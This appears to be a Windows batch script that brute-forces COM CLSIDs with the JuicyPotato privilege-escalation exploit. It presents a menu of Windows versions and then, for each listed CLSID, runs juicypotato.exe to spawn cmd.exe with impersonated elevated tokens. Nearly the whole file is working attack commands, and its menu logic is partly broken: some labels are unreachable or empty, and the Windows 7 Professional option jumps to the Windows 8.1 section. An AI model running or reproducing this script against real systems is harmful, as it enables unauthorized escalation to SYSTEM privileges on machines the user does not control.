echo "1 - Windows Server 2008"
echo "2 - Windows Server 2012 R2"
echo "3 - Windows Server 2016"
echo "4 - Windows 7 Enterprise"
echo "5 - Windows 7 Professional"
echo "6 - Windows 8.1"
echo "0 - kill shell"
set /p var="Select your Operating System: "
IF '%%var%%' == '1' GOTO WS2008
IF '%%var%%' == '2' GOTO WS2012R2
IF '%%var%%' == '3' GOTO WS2016
IF '%%var%%' == '4' GOTO W7
IF '%%var%%' == '5' GOTO w8
IF '%%var%%' == '0' GOTO exit

:WS2008

:WS2012R2
for %%x in (
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
{f3b4e234-7a68-4e43-b813-e4ba55a065f6}
{784E29F4-5EBE-4279-9948-1E8FE941646D}
{eff7f153-1c97-417a-b633-fede6683a939}
{8BC3F05E-D86B-11D0-A075-00C04FB68820}
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{3c6859ce-230b-48a4-be6c-932c0c202048}
{BA126AD2-2166-11D1-B1D0-00805FC1270E}
{BA126ADD-2166-11D1-B1D0-00805FC1270E}
{BA126ADB-2166-11D1-B1D0-00805FC1270E}
{BA126ADE-2166-11D1-B1D0-00805FC1270E}
{BA126AD4-2166-11D1-B1D0-00805FC1270E}
{BA126AD9-2166-11D1-B1D0-00805FC1270E}
{BA126AD5-2166-11D1-B1D0-00805FC1270E}
{BA126AD1-2166-11D1-B1D0-00805FC1270E}
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}
{CD5096A1-E7E7-4E09-8B12-CBF2790A87CF}
{BA126AD7-2166-11D1-B1D0-00805FC1270E}
{BA126AD6-2166-11D1-B1D0-00805FC1270E}
{BA126AE5-2166-11D1-B1D0-00805FC1270E}
{B4C8DF59-D16F-4042-80B7-3557A254B7C5}
{BA126AE3-2166-11D1-B1D0-00805FC1270E}
{BA126AD3-2166-11D1-B1D0-00805FC1270E}
{8C482DCE-2644-4419-AEFF-189219F916B9}
{d20a3293-3341-4ae8-9aaf-8e397cb63c34}
{659cdea7-489e-11d9-a9cd-000d56965251}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{4991d34b-80a1-4291-83b6-3328366b9097}
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%x
echo "Fuzz Completed: "

:WS2016

:W7
for %%y in (
{555F3418-D99E-4E51-800A-6E89CFD8B1D7}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{4991d34b-80a1-4291-83b6-3328366b9097}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{659cdea7-489e-11d9-a9cd-000d56965251}
) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%y
echo "Fuzz Completed: "

:W8
for %%z in (
{eff7f153-1c97-417a-b633-fede6683a939}
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
{f3b4e234-7a68-4e43-b813-e4ba55a065f6}
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{784E29F4-5EBE-4279-9948-1E8FE941646D}
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7}
{B52D54BB-4818-4EB9-AA80-F9EACD371DF8}
{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}
{9E175B6D-F52A-11D8-B9A5-505054503030}
{9E175B68-F52A-11D8-B9A5-505054503030}
{E63DE750-3BD7-4BE5-9C84-6B4281988C44}
{E48EDA45-43C6-48e0-9323-A7B2067D9CD5}
{A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
{8BC3F05E-D86B-11D0-A075-00C04FB68820}
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
{3c6859ce-230b-48a4-be6c-932c0c202048}
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
{BA126AD4-2166-11D1-B1D0-00805FC1270E}
{BA126AE3-2166-11D1-B1D0-00805FC1270E}
{BA126ADE-2166-11D1-B1D0-00805FC1270E}
{BA126AD3-2166-11D1-B1D0-00805FC1270E}
{BA126AD9-2166-11D1-B1D0-00805FC1270E}
{BA126AD5-2166-11D1-B1D0-00805FC1270E}
{BA126ADD-2166-11D1-B1D0-00805FC1270E}
{CD5096A1-E7E7-4E09-8B12-CBF2790A87CF}
{BA126AD2-2166-11D1-B1D0-00805FC1270E}
{B4C8DF59-D16F-4042-80B7-3557A254B7C5}
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}
{BA126AD1-2166-11D1-B1D0-00805FC1270E}
{BA126AD6-2166-11D1-B1D0-00805FC1270E}
{BA126ADB-2166-11D1-B1D0-00805FC1270E}
{BA126AD7-2166-11D1-B1D0-00805FC1270E}
{BA126AE5-2166-11D1-B1D0-00805FC1270E}
{6CF9B800-50DB-46B5-9218-EACF07F5E414}
{8C482DCE-2644-4419-AEFF-189219F916B9}
{d20a3293-3341-4ae8-9aaf-8e397cb63c34}
{659cdea7-489e-11d9-a9cd-000d56965251}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
{4991d34b-80a1-4291-83b6-3328366b9097}
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
{9c212ed3-cfd2-4676-92d8-3fbb2c3a8379}
) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%z
echo "Fuzz Completed: "

:W10ent
for %%a in (
{5B3E6773-3A99-4A3D-8096-7765DD11785C}
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{E48EDA45-43C6-48e0-9323-A7B2067D9CD5}
{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}
{B52D54BB-4818-4EB9-AA80-F9EACD371DF8}
{9E175B68-F52A-11D8-B9A5-505054503030}
{A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
{E63DE750-3BD7-4BE5-9C84-6B4281988C44}
{9E175B6D-F52A-11D8-B9A5-505054503030}
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7}
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}
{8BC3F05E-D86B-11D0-A075-00C04FB68820}
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
{97061DF1-33AA-4B30-9A92-647546D943F3}
{F2DC0F57-0B99-49E3-BE80-936DBAA54EE0}
{B91D5831-B1BD-4608-8198-D72E155020F7}
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{3c6859ce-230b-48a4-be6c-932c0c202048}
{B31118B2-1F49-48E5-B6F5-BC21CAEC56FB}
{4FC0F57B-CF29-46F1-87F9-4CD3F7E7BF77}
{63E491FE-8A41-463C-9EEA-A48757FA8832}
{C41EA9EA-7486-47C4-A44F-A905277A5FFD}
{687e55ca-6621-4c41-b9f1-c0eddc94bb05}
{47135eea-06b6-4452-8787-4a187c64a47e}
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}
{BA126AD5-2166-11D1-B1D0-00805FC1270E}
{CD5096A1-E7E7-4E09-8B12-CBF2790A87CF}
{BA126ADE-2166-11D1-B1D0-00805FC1270E}
{BA126ADD-2166-11D1-B1D0-00805FC1270E}
{BA126AD9-2166-11D1-B1D0-00805FC1270E}
{BA126AE3-2166-11D1-B1D0-00805FC1270E}
{B4C8DF59-D16F-4042-80B7-3557A254B7C5}
{BA126AD6-2166-11D1-B1D0-00805FC1270E}
{BA126AD3-2166-11D1-B1D0-00805FC1270E}
{BA126ADB-2166-11D1-B1D0-00805FC1270E}
{BA126AE5-2166-11D1-B1D0-00805FC1270E}
{BA126AD1-2166-11D1-B1D0-00805FC1270E}
{BA126AD4-2166-11D1-B1D0-00805FC1270E}
{BA126AD7-2166-11D1-B1D0-00805FC1270E}
{BA126AD2-2166-11D1-B1D0-00805FC1270E}
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD}
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}
{C63261E4-6052-41FF-B919-496FECF4C4E5}
{42C21DF5-FB58-4102-90E9-96A213DC7CE8}
{8C482DCE-2644-4419-AEFF-189219F916B9}
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700}
{d20a3293-3341-4ae8-9aaf-8e397cb63c34}
{69486DD6-C19F-42e8-B508-A53F9F8E67B8}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{1ecca34c-e88a-44e3-8d6a-8921bde9e452}
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
{bb6df56b-cace-11dc-9992-0019b93a3a84}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{4d233817-b456-4e75-83d2-b17dec544d12}
{659cdea7-489e-11d9-a9cd-000d56965251}
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
{c980e4c2-c178-4572-935d-a8a429884806}
) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%a
echo "Fuzz Completed: "

:W10pro
for %%b in (
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{b8fc52f5-cb03-4e10-8bcb-e3ec794c54a5}
{E48EDA45-43C6-48e0-9323-A7B2067D9CD5}
{9E175B68-F52A-11D8-B9A5-505054503030}
{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}
{9E175B6D-F52A-11D8-B9A5-505054503030}
{E63DE750-3BD7-4BE5-9C84-6B4281988C44}
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7}
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}
{8BC3F05E-D86B-11D0-A075-00C04FB68820}
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
{97061DF1-33AA-4B30-9A92-647546D943F3}
{3c6859ce-230b-48a4-be6c-932c0c202048}
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
{BA126ADB-2166-11D1-B1D0-00805FC1270E}
{BA126AE5-2166-11D1-B1D0-00805FC1270E}
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}
{BA126AD7-2166-11D1-B1D0-00805FC1270E}
{BA126AD9-2166-11D1-B1D0-00805FC1270E}
{BA126AD6-2166-11D1-B1D0-00805FC1270E}
{BA126ADE-2166-11D1-B1D0-00805FC1270E}
{BA126AD3-2166-11D1-B1D0-00805FC1270E}
{BA126AD1-2166-11D1-B1D0-00805FC1270E}
{BA126AE3-2166-11D1-B1D0-00805FC1270E}
{BA126AD5-2166-11D1-B1D0-00805FC1270E}
{B4C8DF59-D16F-4042-80B7-3557A254B7C5}
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD}
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}
{C63261E4-6052-41FF-B919-496FECF4C4E5}
{8C482DCE-2644-4419-AEFF-189219F916B9}
{d20a3293-3341-4ae8-9aaf-8e397cb63c34}
{69486DD6-C19F-42e8-B508-A53F9F8E67B8}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{bb6df56b-cace-11dc-9992-0019b93a3a84}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{4991d34b-80a1-4291-83b6-3328366b9097}
{659cdea7-489e-11d9-a9cd-000d56965251}
{1ecca34c-e88a-44e3-8d6a-8921bde9e452}
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
) do .\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c %%b
echo "Fuzz Completed: "